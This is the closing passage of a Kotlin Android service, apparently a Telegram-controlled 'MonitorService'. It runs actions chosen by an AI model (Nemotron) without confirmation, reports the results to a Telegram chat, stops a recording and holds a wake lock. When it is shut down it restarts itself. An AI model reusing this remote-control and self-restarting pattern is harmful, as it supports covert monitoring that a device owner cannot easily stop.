                    argsMap[entry.key] = value
                }

                try {
                    val result = executeCapability(action, gson.toJson(argsMap))
                    val m = hashMapOf<String, Any>(
                        "action" to action,
                        "args" to argsMap,
                        "reasoning" to reasoning,
                        "result" to result,
                        "status" to "completed"
                    ) as Map<String, Any>
                    results.add(m)
                } catch (e: Exception) {
                    val m = hashMapOf<String, Any>(
                        "action" to action,
                        "args" to argsMap,
                        "reasoning" to reasoning,
                        "error" to (e.message ?: "unknown error"),
                        "status" to "failed"
                    ) as Map<String, Any>
                    results.add(m)
                }
            }
        } catch (e: Exception) {
            Log.e("AI", "Parse error", e)
            results.add(hashMapOf<String, Any>(
                "error" to (e.message ?: "unknown error"),
                "raw_response" to aiResponse
            ) as Map<String, Any>)
        }
        return results
    }

    private fun handleAiCommand(chatId: Long, prompt: String) {
        val taskId = java.util.UUID.randomUUID().toString()
        val latch = CountDownLatch(1)
        val callback = TelegramCallback(chatId, latch)
        telegramCallbacks[taskId] = callback

        Thread({
            try {
                val aiResponse = callNemotron(prompt)
                Log.d("AI", "Nemotron response: $aiResponse")

                val results = executeAiActions(aiResponse)

                val summary = StringBuilder("AI Task $taskId completed:\n\n")
                results.forEach { r ->
                    summary.append("Action: ${r["action"]}\n")
                    summary.append("Reasoning: ${r["reasoning"]}\n")
                    if (r["status"] == "completed") {
                        summary.append("Result: ${r["result"]}\n")
                    } else {
                        summary.append("Error: ${r["error"]}\n")
                    }
                    summary.append("\n")
                }

                val msg = summary.toString()
                if (latch.await(60, TimeUnit.SECONDS)) {
                    callback.result = msg
                    callback.status = "completed"
                    callback.latch.countDown()
                    sendTelegramDocument(chatId, "ai_result.txt", msg, "AI Task Result")
                } else {
                    sendTelegramMessage(chatId, "AI task $taskId timed out")
                }
            } catch (e: Exception) {
                Log.e("AI", "Error", e)
                sendTelegramMessage(chatId, "AI Error: ${e.message}")
            } finally {
                telegramCallbacks.remove(taskId)
            }
        }, "ai-$taskId").start()
    }

    override fun onBind(intent: Intent): IBinder = binder

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = if (persistentMode) START_STICKY else START_NOT_STICKY

    override fun onDestroy() {
        running = false
        wakeLock?.release()
        pollThread?.interrupt()
        stopRecording()
        commandReceiver?.let { try { unregisterReceiver(it) } catch (e: Exception) {} }
        if (persistentMode) startService(Intent(this, MonitorService::class.java))
        super.onDestroy()
    }
}